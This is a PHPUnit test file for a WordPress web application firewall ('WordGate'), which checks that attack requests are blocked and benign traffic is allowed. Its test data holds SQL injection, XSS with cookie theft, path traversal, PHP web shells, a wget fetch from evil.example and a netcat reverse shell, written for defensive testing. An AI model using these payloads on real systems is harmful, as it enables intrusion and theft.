<?php
namespace WordGate\Tests\Unit;

use PHPUnit\Framework\TestCase;
use WordGate\Waf\Engine;
use WordGate\Waf\Request;
use WordGate\Waf\Rule;
use WordGate\Waf\Storage;

final class EngineTest extends TestCase {

	/** @var Storage */
	private $storage;

	protected function setUp(): void {
		$dir = WORDGATE_TEST_DATA_DIR . '/' . uniqid( 'engine', true );
		$this->storage = new Storage( $dir );
		$this->storage->ensureDir();
	}

	private function engine( array $config = array() ) {
		$rules = $this->storage->loadRules( __DIR__ . '/../../waf/rules/default.json' );
		return new Engine( $this->storage, $config, $rules );
	}

	private function get( $query, $path = '/', array $extra = array() ) {
		return new Request(
			isset( $extra['ip'] ) ? $extra['ip'] : '203.0.113.10',
			isset( $extra['method'] ) ? $extra['method'] : 'GET',
			$path . ( $query ? '?' . http_build_query( $query ) : '' ),
			$query,
			isset( $extra['body'] ) ? $extra['body'] : array(),
			isset( $extra['cookies'] ) ? $extra['cookies'] : array(),
			isset( $extra['headers'] ) ? $extra['headers'] : array( 'user-agent' => 'Mozilla/5.0' ),
			isset( $extra['files'] ) ? $extra['files'] : array(),
			isset( $extra['raw'] ) ? $extra['raw'] : ''
		);
	}

	public function testAllRulesCompile() {
		$rules = $this->storage->loadRules( __DIR__ . '/../../waf/rules/default.json' );
		$this->assertNotEmpty( $rules );
		foreach ( $rules as $rule ) {
			$this->assertTrue( $rule->isValid(), 'Rule ' . $rule->id . ' has an invalid pattern' );
		}
	}

	/**
	 * @dataProvider maliciousProvider
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider('maliciousProvider')]
	public function testBlocksMalicious( $expectedRule, array $query, $path = '/', array $extra = array() ) {
		$d = $this->engine()->inspect( $this->get( $query, $path, $extra ) );
		$this->assertSame( Engine::BLOCK, $d['action'], 'Expected block for ' . json_encode( $query ) );
		$this->assertSame( $expectedRule, $d['rule']->id, 'Matched rule ' . $d['rule']->id . ' (' . $d['rule']->name . ')' );
	}

	public static function maliciousProvider() {
		return array(
			'union select'           => array( 1001, array( 'id' => "1 UNION ALL SELECT NULL,NULL,user_pass FROM wp_users--" ) ),
			'union comment evasion'  => array( 1001, array( 'id' => "1/**/UnIoN/**/SeLeCt/**/1,2,3" ) ),
			'union junk comment'     => array( 1001, array( 'id' => "1 UNION/*junk*/SELECT 1,2,3 FROM wp_users" ) ),
			'union mysql cond'       => array( 1001, array( 'id' => "1 /*!50000UNION*/ /*!50000SELECT*/ user_pass FROM wp_users" ) ),
			'double encoded union'   => array( 1001, array( 'id' => '1%2520union%2520select%2520concat(user_login)' ) ),
			'tautology quote'        => array( 1002, array( 'user' => "admin' OR '1'='1" ) ),
			'tautology numeric'      => array( 1002, array( 'id' => '5 or 1=1 --' ) ),
			'sleep'                  => array( 1003, array( 'id' => '1 AND SLEEP(5)' ) ),
			'benchmark'              => array( 1003, array( 'q' => 'benchmark(5000000,md5(1))' ) ),
			'information_schema'     => array( 1004, array( 'q' => 'x from information_schema.tables' ) ),
			'stacked drop'           => array( 1004, array( 'id' => '1; DROP TABLE wp_users' ) ),
			'extractvalue'           => array( 1005, array( 'id' => "1 and extractvalue(1,concat(0x7e,version()))" ) ),
			'script tag'             => array( 2001, array( 's' => '<script>alert(1)</script>' ) ),
			'encoded script tag'     => array( 2001, array( 's' => '&lt;script&gt;alert(1)&lt;/script&gt;' ) ),
			'event handler'          => array( 2002, array( 's' => '<img src=x onerror=alert(1)>' ) ),
			'svg onload'             => array( 2002, array( 's' => '<svg/onload=alert(1)>' ) ),
			'javascript uri'         => array( 2003, array( 'url' => 'javascript:alert(document.domain)' ) ),
			'iframe'                 => array( 2004, array( 'name' => '<iframe src="https://evil.example">' ) ),
			'document.cookie'        => array( 2005, array( 'cb' => 'fetch("//x/?"+document.cookie)' ) ),
			'traversal'              => array( 3001, array( 'file' => '../../../../etc/passwd' ) ),
			'traversal wp-config'    => array( 3001, array( 'file' => '../wp-config.php' ) ),
			'traversal backslash'    => array( 3001, array( 'file' => '..\\..\\..\\windows\\win.ini' ) ),
			'lfi absolute'           => array( 3002, array( 'page' => '/etc/passwd' ) ),
			'php filter'             => array( 3003, array( 'f' => 'php://filter/convert.base64-encode/resource=index.php' ) ),
			'phar'                   => array( 3003, array( 'f' => 'phar://uploads/evil.jpg' ) ),
			'rfi'                    => array( 3004, array( 'inc' => 'http://evil.example/shell.txt?' ) ),
			'php eval'               => array( 4001, array( 'x' => '<?php eval($_POST["c"]); ?>' ) ),
			'eval base64'            => array( 4001, array( 'x' => 'eval(base64_decode("ZWNobyAxOw=="))' ) ),
			'cmd wget'               => array( 4002, array( 'host' => '127.0.0.1; wget http://evil.example/x.sh' ) ),
			'cmd subshell'           => array( 4002, array( 'host' => '$(whoami)' ) ),
			'reverse shell'          => array( 4002, array( 'c' => 'x | nc -e /bin/sh 1.2.3.4 4444' ) ),
			'object injection'       => array( 4003, array( 'data' => 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}' ) ),
			'log4shell'              => array( 4004, array(), '/', array( 'headers' => array( 'user-agent' => '${jndi:ldap://x.example/a}' ) ) ),
			'php upload'             => array( 5001, array(), '/wp-admin/admin-ajax.php', array( 'method' => 'POST', 'files' => array( 'f' => array( 'name' => 'shell.php', 'tmp_name' => '' ) ) ) ),
			'double ext upload'      => array( 5001, array(), '/', array( 'method' => 'POST', 'files' => array( 'f' => array( 'name' => 'avatar.php.jpg', 'tmp_name' => '' ) ) ) ),
			'php in image'           => array( 5002, array(), '/', array( 'method' => 'POST', 'files' => array( 'f' => array( 'name' => 'a.jpg', 'tmp_name' => '', 'content' => "GIF89a<?php system(\$_GET['c']); ?>" ) ) ) ),
			'php in large polyglot'  => array( 5002, array(), '/', array( 'method' => 'POST', 'files' => array( 'f' => array( 'name' => 'a.jpg', 'tmp_name' => '', 'content' => 'GIF89a' . str_repeat( 'A', 70000 ) . "<?php system(\$_GET['c']); ?>" ) ) ) ),
			'sqlmap ua'              => array( 6001, array(), '/', array( 'headers' => array( 'user-agent' => 'sqlmap/1.7.2#stable (https://sqlmap.org)' ) ) ),
			'.env probe'             => array( 6002, array(), '/.env' ),
			'.git probe'             => array( 6002, array(), '/.git/config' ),
			'wp-config backup'       => array( 6002, array(), '/wp-config.php.bak' ),
			'uploads php'            => array( 6003, array(), '/wp-content/uploads/2024/01/x.php' ),
			'capabilities'           => array( 7001, array(), '/wp-admin/admin-ajax.php', array( 'method' => 'POST', 'body' => array( 'action' => 'update_profile', 'meta' => array( 'wp_capabilities' => array( 'administrator' => 1 ) ) ) ) ),
			'option tamper'          => array( 7004, array(), '/wp-admin/admin-ajax.php', array( 'method' => 'POST', 'body' => array( 'action' => 'x', 'default_role' => 'administrator' ) ) ),
			'option tamper pathinfo' => array( 7004, array(), '/wp-admin/admin-ajax.php/extra', array( 'method' => 'POST', 'body' => array( 'action' => 'x', 'default_role' => 'administrator' ) ) ),
			'xmlrpc multicall'       => array(
				7002,
				array(),
				'/xmlrpc.php',
				array(
					'method' => 'POST',
					'raw'    => '<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
						. str_repeat( '<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>pass</string></value></data></array></value></member></struct></value>', 5 )
						. '</data></array></value></param></params></methodCall>',
				),
			),
			'xmlrpc multicall pathinfo' => array(
				7002,
				array(),
				'/%78mlrpc.php/extra',
				array(
					'method' => 'POST',
					'raw'    => '<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
						. str_repeat( '<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member></struct></value>', 3 )
						. '</data></array></value></param></params></methodCall>',
				),
			),
		);
	}

	/**
	 * Real-world benign traffic that must never be blocked.
	 *
	 * @dataProvider benignProvider
	 */
	#[\PHPUnit\Framework\Attributes\DataProvider('benignProvider')]
	public function testAllowsBenign( array $query, $path = '/', array $extra = array() ) {
		$d = $this->engine()->inspect( $this->get( $query, $path, $extra ) );
		$this->assertSame( Engine::ALLOW, $d['action'], 'False positive: rule ' . ( $d['rule'] ? $d['rule']->id . ' ' . $d['rule']->name : '' ) . ' on ' . json_encode( $query + $extra ) );
	}

	public static function benignProvider() {
		$comment = array(
			'comment' => "I'd select the union option from the menu, and it's 100% better than the other one. Price: \$5 or 10=ten? Visit https://example.com/page?x=1&y=2 -- thanks!",
			'author'  => "O'Brien",
			'email'   => 'obrien@example.com',
		);
		return array(
			'search'                   => array( array( 's' => 'how to select a union representative' ) ),
			'search sql words'         => array( array( 's' => 'drop table saw for sale' ) ),
			'apostrophes'              => array( array( 's' => "Rock 'n' roll or 'jazz' music" ) ),
			'math'                     => array( array( 'q' => '1+1=2 and 2*2=4' ) ),
			'comment'                  => array( array(), '/wp-comments-post.php', array( 'method' => 'POST', 'body' => $comment ) ),
			'url param'                => array( array( 'redirect_to' => 'https://example.com/wp-admin/' ) ),
			'pagination'               => array( array( 'paged' => '2', 'orderby' => 'date', 'order' => 'DESC' ) ),
			'json body'                => array( array(), '/wp-json/wp/v2/posts', array( 'method' => 'POST', 'body' => array( 'title' => 'Hello', 'status' => 'draft', 'meta' => array( 'a' => 1 ) ) ) ),
			'serialized array'         => array( array( 'data' => 'a:1:{s:3:"foo";s:3:"bar";}' ) ),
			'relative path'            => array( array( 'template' => '../partials/header' ) ),
			'shell words in text'      => array( array( 's' => 'I love dogs; cat owners disagree. Run the id badge printer.' ) ),
			'curl docs'                => array( array( 's' => 'how do I use curl with https' ) ),
			'image upload'             => array( array(), '/wp-admin/async-upload.php', array( 'method' => 'POST', 'files' => array( 'async-upload' => array( 'name' => 'holiday photo.jpg', 'tmp_name' => '', 'content' => "\xFF\xD8\xFF\xE0JFIF" ) ) ) ),
			'pdf upload'               => array( array(), '/', array( 'method' => 'POST', 'files' => array( 'f' => array( 'name' => 'php-guide.pdf', 'tmp_name' => '' ) ) ) ),
			'normal ua'                => array( array(), '/', array( 'headers' => array( 'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15' ) ) ),
			'woocommerce'              => array( array( 'add-to-cart' => '42', 'quantity' => '3', 'variation_id' => '77' ) ),
			'email with plus'          => array( array( 'email' => 'first.last+tag@example.co.uk' ) ),
			'markdown'                 => array( array(), '/', array( 'method' => 'POST', 'body' => array( 'message' => "Use `wp option get home` and see <https://wordpress.org>. Select * from life where fun = true" ) ) ),
			'xmlrpc single'            => array( array(), '/xmlrpc.php', array( 'method' => 'POST', 'raw' => '<methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>' ) ),
			'uploads image'            => array( array(), '/wp-content/uploads/2024/01/photo.jpg' ),
			'profile role'             => array( array(), '/wp-admin/admin-ajax.php', array( 'method' => 'POST', 'body' => array( 'action' => 'save', 'role' => 'subscriber', 'home_address' => '1 Main St' ) ) ),
			'html in admin post'       => array( array(), '/wp-admin/post.php', array( 'method' => 'POST', 'body' => array( 'content' => '<p>Hello <strong>world</strong> <a href="https://x.example">link</a></p>' ) ) ),
			'quoted equality in prose' => array( array( 'q' => 'the "best" = good' ) ),
		);
	}

	public function testAdminCookieBypassesFlaggedRules() {
		$secret  = 'test-secret';
		$token   = Engine::makeAdminToken( 1, time() + 3600, $secret );
		$request = $this->get( array(), '/wp-admin/post.php', array( 'method' => 'POST', 'body' => array( 'content' => '<script>console.log(1)</script>' ), 'cookies' => array( 'wordgate_admin' => $token ) ) );

		$this->assertSame( Engine::ALLOW, $this->engine( array( 'auth_secret' => $secret ) )->inspect( $request )['action'] );
		// Without the right secret the cookie is worthless.
		$this->assertSame( Engine::BLOCK, $this->engine( array( 'auth_secret' => 'other' ) )->inspect( $request )['action'] );
	}

	public function testAdminCookieDoesNotBypassNonFlaggedRules() {
		$secret  = 'test-secret';
		$token   = Engine::makeAdminToken( 1, time() + 3600, $secret );
		$request = $this->get( array( 'id' => '1 union select user_pass from wp_users' ), '/', array( 'cookies' => array( 'wordgate_admin' => $token ) ) );
		$this->assertSame( Engine::BLOCK, $this->engine( array( 'auth_secret' => $secret ) )->inspect( $request )['action'] );
	}

	public function testExpiredAdminTokenRejected() {
		$this->assertFalse( Engine::verifyAdminToken( Engine::makeAdminToken( 1, time() - 1, 's' ), 's' ) );
		$this->assertTrue( Engine::verifyAdminToken( Engine::makeAdminToken( 1, time() + 60, 's' ), 's' ) );
		$this->assertFalse( Engine::verifyAdminToken( '1|9999999999|forged', 's' ) );
	}

	public function testLearningModeLogsButAllows() {
		$d = $this->engine( array( 'mode' => 'learning' ) )->inspect( $this->get( array( 'id' => '1 and sleep(5)' ) ) );
		$this->assertSame( Engine::ALLOW, $d['action'] );
		$this->assertNotEmpty( $d['logged'] );
	}

	public function testDisabledModeAllowsEverything() {
		$d = $this->engine( array( 'mode' => 'disabled' ) )->inspect( $this->get( array( 'id' => '1 and sleep(5)' ) ) );
		$this->assertSame( Engine::ALLOW, $d['action'] );
	}

	public function testDisabledRule() {
		// Disabling regex rule 1003 alone still falls through to SQL tokenizer rule 1006.
		$d = $this->engine( array( 'disabled_rules' => array( 1003 ) ) )->inspect( $this->get( array( 'id' => '1 and sleep(5)' ) ) );
		$this->assertSame( Engine::BLOCK, $d['action'] );
		$this->assertSame( 1006, $d['rule']->id );

		// Disabling both allows the request.
		$d = $this->engine( array( 'disabled_rules' => array( 1003, 1006 ) ) )->inspect( $this->get( array( 'id' => '1 and sleep(5)' ) ) );
		$this->assertSame( Engine::ALLOW, $d['action'] );
	}

	public function testAllowRuleForParamAndPath() {
		$config = array( 'allow_rules' => array( array( 'rule_id' => 2001, 'path' => '^/contact/?$', 'param' => 'body.message' ) ) );
		$body   = array( 'message' => '<script>x</script>' );
		$this->assertSame( Engine::ALLOW, $this->engine( $config )->inspect( $this->get( array(), '/contact/', array( 'method' => 'POST', 'body' => $body ) ) )['action'] );
		$this->assertSame( Engine::BLOCK, $this->engine( $config )->inspect( $this->get( array(), '/other/', array( 'method' => 'POST', 'body' => $body ) ) )['action'] );
	}

	public function testAllowlistedIpSkipsEverything() {
		$this->storage->addBlock( '203.0.113.10', 'test' );
		$d = $this->engine( array( 'allowlist_ips' => array( '203.0.113.0/24' ) ) )->inspect( $this->get( array( 'id' => '1 and sleep(5)' ) ) );
		$this->assertSame( Engine::ALLOW, $d['action'] );
	}

	public function testIpBlock() {
		$this->storage->addBlock( '198.51.100.0/24', 'bad network' );
		$d = $this->engine()->inspect( $this->get( array(), '/', array( 'ip' => '198.51.100.77' ) ) );
		$this->assertSame( Engine::BLOCK, $d['action'] );
		$this->assertStringContainsString( 'bad network', $d['reason'] );
	}

	public function testLoginScopedBlock() {
		$this->storage->addBlock( '198.51.100.8', 'brute force', 60, 'login' );
		$e = $this->engine();
		$this->assertSame( Engine::ALLOW, $e->inspect( $this->get( array(), '/', array( 'ip' => '198.51.100.8' ) ) )['action'] );
		$this->assertSame( Engine::BLOCK, $e->inspect( $this->get( array(), '/wp-login.php', array( 'ip' => '198.51.100.8' ) ) )['action'] );
		$this->assertSame( Engine::BLOCK, $e->inspect( $this->get( array(), '/wp-login.php/extra', array( 'ip' => '198.51.100.8' ) ) )['action'] );
		$this->assertSame( Engine::BLOCK, $e->inspect( $this->get( array(), '/%77p-login.php', array( 'ip' => '198.51.100.8' ) ) )['action'] );
		$this->assertSame( Engine::BLOCK, $e->inspect( $this->get( array(), '/xmlrpc.php/extra', array( 'ip' => '198.51.100.8' ) ) )['action'] );
	}

	public function testExpiredBlockIgnored() {
		$this->storage->addBlock( '198.51.100.9', 'old', 1 );
		$blocks = $this->storage->getBlocks();
		$this->assertArrayHasKey( '198.51.100.9', $blocks );
		// Simulate expiry by rewriting the record.
		$ref = new \ReflectionMethod( $this->storage, 'writePhp' );
		$ref->setAccessible( true );
		$blocks['198.51.100.9']['expires'] = time() - 10;
		$ref->invoke( $this->storage, 'blocks.php', $blocks );
		$fresh = new Storage( $this->storage->dir() );
		$this->assertNull( $fresh->findBlock( '198.51.100.9' ) );
		$this->assertSame( 1, $fresh->purgeExpiredBlocks() );
	}

	public function testRateLimitThrottle() {
		$e   = $this->engine( array( 'rate_limit' => array( 'enabled' => true, 'requests_per_minute' => 3, 'action' => 'throttle' ) ) );
		$req = $this->get( array(), '/', array( 'ip' => '192.0.2.50' ) );
		for ( $i = 0; $i < 3; $i++ ) {
			$this->assertSame( Engine::ALLOW, $e->inspect( $req )['action'] );
		}
		$d = $e->inspect( $req );
		$this->assertSame( Engine::THROTTLE, $d['action'] );
		$this->assertSame( 429, $d['status'] );
	}

	public function testRateLimitBlock() {
		$e   = $this->engine( array( 'rate_limit' => array( 'enabled' => true, 'requests_per_minute' => 2, 'action' => 'block', 'block_minutes' => 5 ) ) );
		$req = $this->get( array(), '/', array( 'ip' => '192.0.2.51' ) );
		$e->inspect( $req );
		$e->inspect( $req );
		$this->assertSame( Engine::BLOCK, $e->inspect( $req )['action'] );
		$this->assertNotNull( $this->storage->findBlock( '192.0.2.51' ) );
	}

	public function testBlocksAreLoggedAndDrainable() {
		$this->engine()->inspect( $this->get( array( 'id' => '1 and sleep(5)' ) ) );
		$records = $this->storage->drainLog();
		$this->assertCount( 1, $records );
		$this->assertSame( 'rule_block', $records[0]['type'] );
		$this->assertSame( 1003, $records[0]['rule_id'] );
		$this->assertSame( array(), $this->storage->drainLog() );
	}

	public function testDrainLogPreservesRemainderAcrossBatches() {
		$engine = $this->engine();
		for ( $i = 0; $i < 5; $i++ ) {
			$engine->inspect( $this->get( array( 'id' => '1 and sleep(' . ( $i + 1 ) . ')' ) ) );
		}
		$this->assertCount( 2, $this->storage->drainLog( 2 ) );
		$this->assertCount( 2, $this->storage->drainLog( 2 ) );
		$this->assertCount( 1, $this->storage->drainLog( 2 ) );
		$this->assertSame( array(), $this->storage->drainLog( 2 ) );
	}

	public function testRuleCompileDoesNotDoubleEscapeHash() {
		$this->assertSame( '#foo\\#bar#iSs', Rule::compile( 'foo#bar' ) );
		$this->assertSame( '#foo\\#bar#iSs', Rule::compile( 'foo\\#bar' ) );
		$this->assertSame( '#foo\\\\\\#bar#iSs', Rule::compile( 'foo\\\\#bar' ) );
		$this->assertSame( 1, preg_match( Rule::compile( 'foo\\#bar' ), 'foo#bar' ) );
	}
}
